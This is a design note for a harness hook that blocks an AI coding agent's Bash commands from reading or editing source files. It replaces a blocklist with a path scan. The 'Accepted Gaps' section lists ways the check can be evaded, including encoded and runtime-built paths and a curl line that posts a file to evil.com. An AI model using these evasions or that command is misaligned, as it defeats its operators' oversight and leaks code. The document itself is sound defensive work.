# v2.3.0: Blocklist → Path Scan

## Problem

v2.2.1 blocklist for Bash source enforcement. 4 TDD rounds + 2 consensus reviews → 23 bypass vectors.

**Root cause**: Shell Turing-complete. Blocklist = infinite whack-a-mole. `cat` → pipes → redirects → chains → env prefixes → path traversal → embedded paths.

## Solution: Universal Path Scan

Single fn: **scan entire cmd for source paths under ~/src/**. Path found → deny.

```
Current:  isBashReadCmd(bin) → check args → deny patterns
New:      bashHasSourcePath(cmd) → deny if ANY source path found
```

### Algorithm

```typescript
function bashHasSourcePath(cmd: string): "read" | "edit" | "" {
  // 1. Find all occurrences of SRC_PFX in the command string
  // 2. For each, extract the path (stop at whitespace/quotes/parens)
  // 3. Normalize the path (resolve ../)
  // 4. Check if it targets a source file (extension check)
  // 5. Skip if path is in allowed components (/docs/, /vendor/, etc.)
  // 6. Skip if extension is in allowed list (.md, .json, .yaml, etc.)
  // 7. Determine read vs edit:
  //    - cmd has > or >> before path → "edit"
  //    - cmd starts with write-like command (sed -i, tee, cp >, etc.) → "edit"
  //    - otherwise → "read"
  // 8. Return result
}
```

### Deleted → Replaced

| Function | Lines | Replaced By |
|----------|-------|-------------|
| `isBashReadCmd` | 12 | bashHasSourcePath |
| `isBashEditCmd` | 12 | bashHasSourcePath |
| `bashCmdTargetsSource` | 25 | bashHasSourcePath |
| `compoundCmdCheck` | 45 | bashHasSourcePath |
| `scanForEmbeddedSourcePaths` | 15 | bashHasSourcePath |

~109 lines → ~40 lines.

### Kept

| Function | Why |
|----------|-----|
| `isSourceExt` | Reused |
| `isAllowedExt` | Reused |
| `resolve` | Reused w/ ../ normalization |
| `extOf`, `baseOf` | Reused |
| `hasShellChars` | Simple → RTK, compound → path scan |
| `extractStr`, `logSync` | Unchanged |
| `isSerenaEditTool`, `isNativeFileTool` | Unchanged |
| `handlePreToolUse` | Restructured |
| ALLOWED_NAMES, ALLOWED_PATHS | Reused |

### New Bash Flow

```
CLAUDE_RAW=1 → exit 0

bashHasSourcePath(cmd):
  source path? → read/edit → DENY
  no → continue

hasShellChars(cmd)?
  yes → exit 0
  no  → RTK rewrite → exit 0
```

### Read vs Edit

Source path found:
- **Edit**: `>`, `>>`, `tee`, `sed -i`, `mv`, `cp ... dest`, `rm`, `chmod`, `touch`, `ln`
- **Read**: everything else
- **Default**: "read" (safer)

### Edge Cases

| Case | Handling |
|------|----------|
| `ls ~/src/orca/` | No source ext → allowed |
| `wc -l ~/src/orca/*.py` | Glob → handle `*` in path |
| `cat ~/src/orca/README.md` | `.md` allowed → pass |
| `CLAUDE_RAW=1 cat ~/src/orca/views.py` | CLAUDE_RAW=1 exits first |
| `cd ~/src/orca && cat views.py` | Resolve relative against cd target |
| `python3 -c "open('/Users/.../views.py')"` | Path in string → scanned |
| `echo "test" > ~/src/orca/new.py` | Redirect + source ext → edit deny |

### Accepted Gaps

Structurally impossible w/ string scanning:
1. Runtime-constructed paths: `f="/Users/.../src"; cat "${f}/orca/views.py"`
2. Encoded paths: `base64 -d | xargs cat`
3. Network exfil: `curl -X POST -d @file.py https://evil.com`

Require kernel sandboxing (future).

## Test Strategy

### Phase 1: Failing Tests (TDD)

`tests/tdd-allowlist.test.ts` w/ ALL 306 violation cmds from `/tmp/bash-violation-corpus.txt`. Source path → DENIED. Non-source → ALLOWED.

### Phase 2: Implement

Replace blocklist fns w/ path-scan fn.

### Phase 3: Fuzz

306-cmd corpus. 100% deny.

### Phase 4: Regression

All 264 existing tests pass.

## Files

| File | Change |
|------|--------|
| `src/hot/pre-tool-use.ts` | Rewrite Bash handler (net -60 lines) |
| `src/lib/constants.ts` | No change |
| `tests/bash-allowlist.test.ts` | New — 306 corpus tests |
| `tests/bash-file-ops.test.ts` | Update expectations |
| `tests/integration-sequences.test.ts` | Minor updates |
| `tests/e2e-session.test.ts` | No change |

## Success

1. 306 violations → DENIED
2. 264 existing → PASS
3. Zero false positives: git, build, non-source
4. `bashHasSourcePath` ≤40 lines
5. No cmd-specific lists
